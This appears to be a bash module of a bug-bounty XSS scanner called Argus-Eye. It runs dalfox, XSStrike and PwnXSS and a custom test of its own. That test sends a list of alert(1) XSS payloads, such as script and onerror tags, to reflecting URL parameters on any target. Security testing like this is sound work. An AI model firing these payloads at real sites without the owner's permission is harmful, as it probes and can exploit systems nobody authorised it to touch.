#!/bin/bash
# ================================================
# ARGUS-EYE - XSS Scanner Module (Generic - Best Effort)
# Fully target-agnostic. Designed for real-world / bug-bounty use.
# ================================================

SCANNER_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CORE_DIR="$(cd "$SCANNER_DIR/../core" && pwd)"
source "$CORE_DIR/utils.sh" 2>/dev/null || true
source "$CORE_DIR/installer.sh" 2>/dev/null || true

SCRIPT_DIR="$(cd "$SCANNER_DIR/../.." && pwd)"

# ================================================
# PROGRESS HELPERS
# ================================================
show_step() {
    local s=$1 t=$2 tool=$3 st=$4
    case $st in
        "start")    >&2 echo -ne "\n ${CYAN}▶ Step $s/$t:${NC} Running $tool... " ;;
        "complete") >&2 echo -e "${GREEN}✓${NC}" ;;
        "fail")     >&2 echo -e "${RED}✗${NC}" ;;
        "skip")     >&2 echo -e "${YELLOW}skipped${NC}" ;;
    esac
}

# ================================================
# URL HELPERS (critical for correct testing)
# ================================================

# Returns the base URL without query string or fragment
get_base_url() {
    local url="$1"
    echo "$url" | sed -E 's/[?#].*$//'
}

# Returns existing query string (without leading ?)
get_query_string() {
    local url="$1"
    if [[ "$url" == *"?"* ]]; then
        echo "$url" | sed -E 's/^[^?]*\?//' | sed -E 's/#.*$//'
    else
        echo ""
    fi
}

# Build a new URL with a parameter added or replaced
# Usage: build_url "http://site.com/page?a=1" "param" "value"
build_url() {
    local base_url="$1"
    local param="$2"
    local value="$3"

    local pure_base
    pure_base=$(get_base_url "$base_url")
    local existing_qs
    existing_qs=$(get_query_string "$base_url")

    # URL-encode the value
    local encoded_value
    encoded_value=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$value" 2>/dev/null || \
                    echo "$value" | sed 's/ /%20/g; s/</%3C/g; s/>/%3E/g; s/"/%22/g; s/'"'"'/%27/g; s/&/%26/g')

    if [[ -z "$existing_qs" ]]; then
        echo "${pure_base}?${param}=${encoded_value}"
        return
    fi

    # Replace existing parameter if present, otherwise append
    if echo "$existing_qs" | grep -qE "(^|&)${param}="; then
        local new_qs
        new_qs=$(echo "$existing_qs" | sed -E "s/(^|&)${param}=[^&]*/\1${param}=${encoded_value}/")
        new_qs=$(echo "$new_qs" | sed 's/^&//')
        echo "${pure_base}?${new_qs}"
    else
        echo "${pure_base}?${existing_qs}&${param}=${encoded_value}"
    fi
}

# ================================================
# TOOL RUNNERS
# ================================================

run_dalfox() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "dalfox" "start"

    local dalfox_bin=""
    if [[ -x "$SCRIPT_DIR/tools/bin/dalfox" ]]; then
        dalfox_bin="$SCRIPT_DIR/tools/bin/dalfox"
    elif [[ -x "$SCRIPT_DIR/tools/dalfox/dalfox" ]]; then
        dalfox_bin="$SCRIPT_DIR/tools/dalfox/dalfox"
    elif command -v dalfox >/dev/null 2>&1; then
        dalfox_bin="$(command -v dalfox)"
    fi

    if [[ -z "$dalfox_bin" ]]; then
        >&2 echo -e "${YELLOW}[!] dalfox not found – attempting install into tools/...${NC}"
        if declare -f install_tool >/dev/null 2>&1; then
            install_tool "dalfox" 2>&1 | tail -8 || true
        elif [[ -f "$CORE_DIR/installer.sh" ]]; then
            source "$CORE_DIR/installer.sh" 2>/dev/null
            install_tool "dalfox" 2>&1 | tail -8 || true
        fi
        if [[ -x "$SCRIPT_DIR/tools/bin/dalfox" ]]; then
            dalfox_bin="$SCRIPT_DIR/tools/bin/dalfox"
        elif [[ -x "$SCRIPT_DIR/tools/dalfox/dalfox" ]]; then
            dalfox_bin="$SCRIPT_DIR/tools/dalfox/dalfox"
        elif command -v dalfox >/dev/null 2>&1; then
            dalfox_bin="$(command -v dalfox)"
        fi
    fi

    if [[ -z "$dalfox_bin" ]]; then
        >&2 echo -e "${RED}[!] dalfox still not available – skipping${NC}"
        show_step "$step" "$total" "dalfox" "skip"
        echo "0"
        return
    fi

    >&2 echo -e "  ${CYAN}[*] dalfox: $dalfox_bin${NC}"
    >&2 echo -e "  ${CYAN}[*] target: $target (timeout 180s)${NC}"

    # Clear output file
    : > "$out"

    # Build args (same spirit as original working script)
    # Capture FULL stdout+stderr into raw file (what you need for later AI analysis)
    local extra_args=()
    [[ -n "$COOKIE" ]] && extra_args+=(--cookie "$COOKIE")
    [[ -n "$HEADER" ]] && extra_args+=(--header "$HEADER")

    # Run like original: mining-dict, full log to file, realistic timeout
    # --no-spinner keeps log clean; do NOT use --silence so we keep useful lines
    set +e
    timeout --signal=TERM 180 "$dalfox_bin" url "$target" \
        --no-spinner \
        --mining-dict \
        --skip-bav \
        --worker 20 \
        --output "$out" \
        "${extra_args[@]}" \
        >> "$out" 2>&1
    local rc=$?
    set -e

    if [[ $rc -eq 124 || $rc -eq 137 ]]; then
        >&2 echo -e "  ${YELLOW}[!] dalfox timed out after 180s – partial raw output kept${NC}"
        echo "" >> "$out"
        echo "[Argus-Eye] dalfox timed out after 180s – partial results above" >> "$out"
    elif [[ $rc -ne 0 ]]; then
        >&2 echo -e "  ${YELLOW}[!] dalfox exit code: $rc (raw output still saved)${NC}"
        echo "" >> "$out"
        echo "[Argus-Eye] dalfox exit code: $rc" >> "$out"
    fi

    local count=0
    if [[ -f "$out" && -s "$out" ]]; then
        local lines
        lines=$(wc -l < "$out" 2>/dev/null | tr -d ' ')
        count=$(grep -cE '\[POC\]|\[V\]|POC\[|Triggered XSS|vulnerable' "$out" 2>/dev/null || echo 0)
        # normalize count
        [[ "$count" =~ ^[0-9]+$ ]] || count=0

        >&2 echo -e "  ${CYAN}[*] dalfox raw lines: $lines | POC-like: $count${NC}"

        {
            echo "=== DALFOX RAW OUTPUT SAVED ==="
            echo "File: $out"
            echo "Lines: $lines"
            echo "POC-like matches: $count"
            if [[ $count -gt 0 ]]; then
                echo "--- Extracted POC lines ---"
                grep -E '\[POC\]|\[V\]|Triggered XSS|vulnerable' "$out" | head -40 || true
            fi
        } >> "$findings_file"
    else
        >&2 echo -e "  ${YELLOW}[!] dalfox produced empty output file${NC}"
        echo "=== DALFOX: empty output ===" >> "$findings_file"
    fi

    show_step "$step" "$total" "dalfox" "complete"
    echo "$count"
}

run_xsstrike() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "XSStrike" "start"

    local xs_script=""
    local xs_bin=""

    if [[ -f "$SCRIPT_DIR/tools/XSStrike/xsstrike.py" ]]; then
        xs_script="$SCRIPT_DIR/tools/XSStrike/xsstrike.py"
    elif [[ -x "$SCRIPT_DIR/tools/bin/xsstrike" ]]; then
        xs_bin="$SCRIPT_DIR/tools/bin/xsstrike"
    elif command -v xsstrike >/dev/null 2>&1; then
        xs_bin="xsstrike"
    fi

    if [[ -z "$xs_script" && -z "$xs_bin" ]]; then
        >&2 echo -e "${YELLOW}[!] XSStrike not found – attempting install into tools/...${NC}"
        if declare -f install_tool >/dev/null 2>&1; then
            install_tool "XSStrike" 2>&1 | tail -5 || true
        fi
        if [[ -f "$SCRIPT_DIR/tools/XSStrike/xsstrike.py" ]]; then
            xs_script="$SCRIPT_DIR/tools/XSStrike/xsstrike.py"
        fi
    fi

    if [[ -z "$xs_script" && -z "$xs_bin" ]]; then
        >&2 echo -e "${RED}[!] XSStrike still not available – skipping${NC}"
        show_step "$step" "$total" "XSStrike" "skip"
        echo "0"
        return
    fi

    : > "$out"
    >&2 echo -e "  ${CYAN}[*] XSStrike target: $target${NC}"

    # Prefer direct testing when URL already has parameters (more reliable than crawl)
    # Crawl only when URL has no query string
    local has_query=0
    [[ "$target" == *\?* ]] && has_query=1

    set +e
    if [[ -n "$xs_script" ]]; then
        if [[ $has_query -eq 1 ]]; then
            >&2 echo -e "  ${CYAN}[*] Mode: direct (URL has parameters)${NC}"
            timeout --signal=TERM 150 python3 "$xs_script" -u "$target" --fuzzer --skip >> "$out" 2>&1
        else
            >&2 echo -e "  ${CYAN}[*] Mode: crawl + fuzzer${NC}"
            timeout --signal=TERM 150 python3 "$xs_script" -u "$target" --crawl --skip >> "$out" 2>&1
            # If crawl failed to connect, retry once without crawl on same URL
            if grep -qi "Unable to connect" "$out" 2>/dev/null; then
                >&2 echo -e "  ${YELLOW}[!] Crawl had connection errors – retrying direct mode${NC}"
                echo "" >> "$out"
                echo "=== RETRY DIRECT MODE ===" >> "$out"
                timeout --signal=TERM 90 python3 "$xs_script" -u "$target" --fuzzer --skip >> "$out" 2>&1
            fi
        fi
    else
        if [[ $has_query -eq 1 ]]; then
            timeout --signal=TERM 150 "$xs_bin" -u "$target" --fuzzer --skip >> "$out" 2>&1
        else
            timeout --signal=TERM 150 "$xs_bin" -u "$target" --crawl --skip >> "$out" 2>&1
            if grep -qi "Unable to connect" "$out" 2>/dev/null; then
                echo "" >> "$out"
                echo "=== RETRY DIRECT MODE ===" >> "$out"
                timeout --signal=TERM 90 "$xs_bin" -u "$target" --fuzzer --skip >> "$out" 2>&1
            fi
        fi
    fi
    local rc=$?
    set -e

    if [[ $rc -eq 124 || $rc -eq 137 ]]; then
        >&2 echo -e "  ${YELLOW}[!] XSStrike timed out – partial raw output kept${NC}"
        echo "[Argus-Eye] XSStrike timed out – partial results above" >> "$out"
    fi

    local count=0
    if [[ -f "$out" && -s "$out" ]]; then
        local lines
        lines=$(wc -l < "$out" 2>/dev/null | tr -d ' ')
        count=$(grep -ciE 'Vulnerable|Vector for|Payload:|Reflected|XSS found|potentially vulnerable' "$out" 2>/dev/null || echo 0)
        [[ "$count" =~ ^[0-9]+$ ]] || count=0

        >&2 echo -e "  ${CYAN}[*] XSStrike raw lines: $lines | hit-like: $count${NC}"

        {
            echo "=== XSStrike RAW OUTPUT SAVED ==="
            echo "File: $out"
            echo "Lines: $lines"
            echo "Hit-like matches: $count"
            if [[ $count -gt 0 ]]; then
                echo "--- Extracted lines ---"
                grep -iE 'Vulnerable|Vector for|Payload:|Reflected|XSS found|potentially vulnerable' "$out" | head -50 || true
            elif grep -qi "Unable to connect" "$out" 2>/dev/null; then
                echo "NOTE: XSStrike reported connection failures to the target."
            fi
        } >> "$findings_file"
    else
        echo "=== XSStrike: empty output ===" >> "$findings_file"
    fi

    show_step "$step" "$total" "XSStrike" "complete"
    echo "$count"
}

run_pwnxss() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "PwnXSS" "start"

    local pwn_script=""
    local pwn_bin=""

    if [[ -f "$SCRIPT_DIR/tools/PwnXSS/pwnxss.py" && -s "$SCRIPT_DIR/tools/PwnXSS/pwnxss.py" ]]; then
        pwn_script="$SCRIPT_DIR/tools/PwnXSS/pwnxss.py"
    elif [[ -f "$SCRIPT_DIR/tools/PwnXSS/PwnXSS.py" && -s "$SCRIPT_DIR/tools/PwnXSS/PwnXSS.py" ]]; then
        pwn_script="$SCRIPT_DIR/tools/PwnXSS/PwnXSS.py"
    elif [[ -x "$SCRIPT_DIR/tools/bin/pwnxss" ]]; then
        pwn_bin="$SCRIPT_DIR/tools/bin/pwnxss"
    elif command -v pwnxss >/dev/null 2>&1; then
        pwn_bin="pwnxss"
    fi

    if [[ -z "$pwn_script" && -z "$pwn_bin" ]]; then
        >&2 echo -e "${YELLOW}[!] PwnXSS not found – attempting install into tools/...${NC}"
        if declare -f install_tool >/dev/null 2>&1; then
            install_tool "PwnXSS" 2>&1 | tail -5 || true
        fi
        if [[ -f "$SCRIPT_DIR/tools/PwnXSS/pwnxss.py" ]]; then
            pwn_script="$SCRIPT_DIR/tools/PwnXSS/pwnxss.py"
        elif [[ -f "$SCRIPT_DIR/tools/PwnXSS/PwnXSS.py" ]]; then
            pwn_script="$SCRIPT_DIR/tools/PwnXSS/PwnXSS.py"
        fi
    fi

    if [[ -z "$pwn_script" && -z "$pwn_bin" ]]; then
        >&2 echo -e "${RED}[!] PwnXSS still not available – skipping${NC}"
        show_step "$step" "$total" "PwnXSS" "skip"
        echo "0"
        return
    fi

    if [[ -n "$pwn_script" ]]; then
        timeout 90 python3 "$pwn_script" -u "$target" > "$out" 2>&1 || true
    else
        timeout 90 "$pwn_bin" -u "$target" > "$out" 2>&1 || true
    fi

    local count=0
    if [[ -f "$out" && -s "$out" ]]; then
        count=$(grep -ciE 'vulnerable|XSS|found|payload' "$out" 2>/dev/null || echo 0)
        if [[ $count -gt 0 ]]; then
            {
                echo "=== PwnXSS FINDINGS ==="
                grep -iE 'vulnerable|XSS|found|payload' "$out" | head -30 || true
            } >> "$findings_file"
        fi
    fi

    show_step "$step" "$total" "PwnXSS" "complete"
    echo "$count"
}

run_custom_xss_tests() {
    local target=$1 out=$2 findings_file=$3 step=$4 total=$5
    show_step "$step" "$total" "Custom Tests" "start"

    local counter=0
    local base_url
    base_url=$(get_base_url "$target")

    # Unique canary
    local CANARY="argusxss$(date +%s | tail -c 5)"

    # Practical payloads
    local payloads=(
        "<script>alert(1)</script>"
        "\"><img src=x onerror=alert(1)>"
        "'><svg/onload=alert(1)>"
        "<svg/onload=alert(1)>"
        "<img src=x onerror=alert(1)>"
        "\" onmouseover=alert(1) x=\""
        "'\"><script>alert(1)</script>"
        "javascript:alert(1)"
        "<body onload=alert(1)>"
        "<details open ontoggle=alert(1)>"
    )

    # Parameter list
    local params=(
        "q" "search" "query" "s" "keyword" "term" "text" "input" "searchFor"
        "tfSearch" "RetURL" "returl" "return" "redirect" "next" "url" "page"
        "id" "name" "username" "user" "email" "message" "comment" "content"
        "title" "desc" "data" "value" "param" "keywords" "searchstring"
    )

    {
        echo "=== GENERIC CUSTOM XSS TESTS ==="
        echo "Target        : $target"
        echo "Base URL      : $base_url"
        echo "Date          : $(date)"
        echo "Canary        : $CANARY"
        echo "Payloads      : ${#payloads[@]}"
        echo "Parameters    : ${#params[@]}"
        echo ""
    } > "$out"

    # -------------------------------------------------
    # Phase 1: Find which parameters actually reflect
    # -------------------------------------------------
    local reflecting_params=()
    >&2 echo -e "  ${CYAN}[*] Discovering reflecting parameters...${NC}"

    for param in "${params[@]}"; do
        local test_url
        test_url=$(build_url "$target" "$param" "$CANARY")

        local response=""
        if [[ -n "$COOKIE" ]]; then
            response=$(curl -s -L --max-time 6 -A "Mozilla/5.0 (Argus-Eye)" -H "Cookie: $COOKIE" "$test_url" 2>/dev/null || true)
        else
            response=$(curl -s -L --max-time 6 -A "Mozilla/5.0 (Argus-Eye)" "$test_url" 2>/dev/null || true)
        fi

        if echo "$response" | grep -qF "$CANARY"; then
            reflecting_params+=("$param")
            echo "[REFLECT] Parameter '$param' reflects input → $test_url" >> "$out"
        fi
    done

    # Fallback: if very few/no reflecting params on the given URL,
    # also try common search endpoints on the same host
    if [[ ${#reflecting_params[@]} -lt 2 ]]; then
        local host_base
        host_base=$(echo "$target" | sed -E 's#(https?://[^/]+).*#\1#')
        local fallback_paths=("/Search.asp" "/search" "/search.php" "/search.jsp" "/index.php" "/")
        local fallback_params=("tfSearch" "q" "search" "query" "searchFor")

        >&2 echo -e "  ${CYAN}[*] Low reflection on given URL – trying common search endpoints...${NC}"
        echo "" >> "$out"
        echo "=== FALLBACK: Common search endpoints ===" >> "$out"

        for fpath in "${fallback_paths[@]}"; do
            for fparam in "${fallback_params[@]}"; do
                local furl="${host_base}${fpath}"
                local test_url
                test_url=$(build_url "$furl" "$fparam" "$CANARY")

                local response=""
                if [[ -n "$COOKIE" ]]; then
                    response=$(curl -s -L --max-time 5 -A "Mozilla/5.0 (Argus-Eye)" -H "Cookie: $COOKIE" "$test_url" 2>/dev/null || true)
                else
                    response=$(curl -s -L --max-time 5 -A "Mozilla/5.0 (Argus-Eye)" "$test_url" 2>/dev/null || true)
                fi

                if echo "$response" | grep -qF "$CANARY"; then
                    # Found a better reflecting endpoint – switch to it
                    if [[ ! " ${reflecting_params[*]} " =~ " ${fparam} " ]]; then
                        reflecting_params+=("$fparam")
                    fi
                    # Also update target for payload testing if this is clearly better
                    if [[ ${#reflecting_params[@]} -eq 1 ]]; then
                        target="$furl"
                        echo "[FALLBACK] Using better endpoint: $furl (param: $fparam)" >> "$out"
                        >&2 echo -e "  ${GREEN}[✓] Fallback endpoint found: $furl${NC}"
                    else
                        echo "[FALLBACK] Extra reflecting param on $furl → $fparam" >> "$out"
                    fi
                fi
            done
        done
    fi

    if [[ ${#reflecting_params[@]} -eq 0 ]]; then
        echo "No reflecting parameters found with common names on the given URL or fallbacks." >> "$out"
        >&2 echo -e "  ${YELLOW}[!] No reflecting parameters discovered${NC}"
        show_step "$step" "$total" "Custom Tests" "complete"
        echo "0"
        return
    fi

    >&2 echo -e "  ${GREEN}[✓] Reflecting parameters: ${reflecting_params[*]}${NC}"
    echo "" >> "$out"
    echo "Reflecting parameters: ${reflecting_params[*]}" >> "$out"
    echo "" >> "$out"

    # -------------------------------------------------
    # Phase 2: Test real XSS payloads only on reflecting parameters
    # -------------------------------------------------
    for param in "${reflecting_params[@]}"; do
        for payload in "${payloads[@]}"; do
            local test_url
            test_url=$(build_url "$target" "$param" "$payload")

            local response=""
            if [[ -n "$COOKIE" ]]; then
                response=$(curl -s -L --max-time 7 -A "Mozilla/5.0 (Argus-Eye XSS Scanner)" -H "Cookie: $COOKIE" "$test_url" 2>/dev/null || true)
            else
                response=$(curl -s -L --max-time 7 -A "Mozilla/5.0 (Argus-Eye XSS Scanner)" "$test_url" 2>/dev/null || true)
            fi

            local is_interesting=false

            # 1. Exact (unencoded) payload
            if echo "$response" | grep -qF "$payload"; then
                is_interesting=true
            fi

            # 2. URL-encoded version of the payload (very common)
            if ! $is_interesting; then
                local encoded_payload
                encoded_payload=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || true)
                if [[ -n "$encoded_payload" ]] && echo "$response" | grep -qF "$encoded_payload"; then
                    is_interesting=true
                fi
            fi

            # 3. Common XSS pattern match
            if ! $is_interesting; then
                if echo "$response" | grep -qiE 'onerror[[:space:]]*=[[:space:]]*["'"'"']?alert|onload[[:space:]]*=[[:space:]]*["'"'"']?alert|<script[^>]*>[^<]*alert|javascript:[[:space:]]*alert'; then
                    is_interesting=true
                fi
            fi

            if $is_interesting; then
                echo "[POTENTIAL XSS] param=$param | $test_url" | tee -a "$out" >> "$findings_file"
                ((counter++))
            fi
        done
    done

    echo "" >> "$out"
    echo "Custom tests finished. Potential findings: $counter" >> "$out"
    show_step "$step" "$total" "Custom Tests" "complete"
    echo "$counter"
}

# ================================================
# MAIN SCAN FUNCTION
# ================================================
scan_xss() {
    local target=$1
    local output_dir=$2
    local tools=${3:-"dalfox custom_tests"}

    mkdir -p "$output_dir/raw_output"
    local findings_file="$output_dir/raw_output/xss_findings.txt"
    : > "$findings_file"

    local tool_array=()
    if [[ "$tools" == "ALL" || "$tools" == "all" ]]; then
        tool_array=(dalfox XSStrike PwnXSS custom_tests)
    else
        IFS=' ' read -ra tool_array <<< "$tools"
    fi

    local total_tools=${#tool_array[@]}
    local tools_run=0
    local total_findings=0

    >&2 echo ""
    >&2 echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
    >&2 echo -e "${CYAN}║              XSS SCANNER (Generic / Best Effort)             ║${NC}"
    >&2 echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
    >&2 echo -e "  Target : ${GREEN}$target${NC}"
    >&2 echo -e "  Tools  : ${YELLOW}${tool_array[*]}${NC}"
    [[ -n "$COOKIE" ]] && >&2 echo -e "  Cookie : ${YELLOW}provided${NC}"
    >&2 echo ""

    for tool in "${tool_array[@]}"; do
        tools_run=$((tools_run + 1))
        local tool_output="$output_dir/raw_output/${tool}_xss.txt"
        local tool_findings=0

        case "$tool" in
            "dalfox")
                tool_findings=$(run_dalfox "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            "XSStrike"|"xsstrike")
                tool_findings=$(run_xsstrike "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            "PwnXSS"|"pwnxss")
                tool_findings=$(run_pwnxss "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            "custom_tests"|"custom")
                tool_findings=$(run_custom_xss_tests "$target" "$tool_output" "$findings_file" "$tools_run" "$total_tools")
                ;;
            *)
                >&2 echo -e "${YELLOW}[!] Unknown tool '$tool' – skipping${NC}"
                tool_findings=0
                ;;
        esac

        [[ "$tool_findings" =~ ^[0-9]+$ ]] || tool_findings=0
        total_findings=$((total_findings + tool_findings))
    done

    {
        echo ""
        echo "========================================"
        echo "XSS SCAN SUMMARY"
        echo "========================================"
        echo "Target          : $target"
        echo "Tools requested : ${tool_array[*]}"
        echo "Total findings  : $total_findings"
        echo "Timestamp       : $(date)"
        echo "========================================"
    } | tee -a "$findings_file" >&2

    echo "$total_findings" > "$output_dir/raw_output/xss_summary.txt"
    echo "$total_findings"
}

# ================================================
# ENTRY POINT
# ================================================
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ $# -lt 2 ]]; then
        echo "Usage: $0 <target_url> <output_dir> [tools]"
        echo "Example: $0 'http://testasp.vulnweb.com/Login.asp?RetURL=/' /tmp/out 'dalfox custom_tests'"
        echo ""
        echo "Optional environment variables:"
        echo "  COOKIE='session=abc; token=xyz'"
        echo "  HEADER='X-Custom: value'"
        exit 1
    fi
    findings=$(scan_xss "$1" "$2" "${3:-dalfox custom_tests}")
    echo "$findings"
fi
